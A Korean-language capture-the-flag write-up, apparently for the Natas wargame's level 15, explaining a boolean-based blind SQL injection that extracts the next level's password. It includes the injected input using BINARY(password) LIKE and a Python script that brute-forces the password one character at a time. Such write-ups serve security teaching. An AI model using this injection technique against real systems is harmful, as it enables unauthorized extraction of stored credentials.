# Category

web

# Overview

Username:

# Analysis

- 소스코드에 유저 테이블 정보 `username`, `password`를 통해 다음 비밀번호인 `username: natas16`, `password: [A-Za-z0-9]`정보를 예상할 수 있다.
- `username` 조건을 통해 유저들의 정보를 가져오는 쿼리문에 사용자의 입력값이 쿼리문 사이에 그대로 반영되기 때문에 sql injection 공격이 가능하다
- 쿼리문 조회 후 유저의 존재여부를 반환하기 때문에 boolean-based blind sql injection 공격을 통해 비밀번호를 유추해볼 수 있다.

# Exploitation

- `password` 32자, 단어구성 `[A-Za-z0-9]`을 알고 있고, `LIKE`를 활용하여 blind sql injection을 수행한다.

- mysql에서 `LIKE`는 대소문자를 구분하지 않기 때문에 `BINARY()`를 활용하여 구문을 만들 수 있다.

  ```sql
  -- 입력값
  -- natas16" AND BINARY(password) LIKE "[a-zA-Z0-9]

  SELECT *
  from users
  where username="natas16" AND BINARY(password) LIKE "[a-zA-Z0-9]";
  ```

  ```py
  # solve.py

  def request(answer: str):
      res = req(
          url=url,
          method="POST",
          auth=auth,
          # LIKE에서 대소문자 구분을 안하는 것을 BINARY()를 통해 구분하게 변경
          data={"username": f'natas16" AND BINARY(password) LIKE "{answer}%'},
      )

      return res.text

  # 비밀번호 후보
    candidate = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    answer = ""
    # 비밀번호 자리수 만큼 반복
    for _ in range(32):
        for c in candidate:
            print(answer + c)
            res = request(answer + c)
            if "This user exists." in res:
                answer += c
                break
  ```

# Flag

`hP...Go`
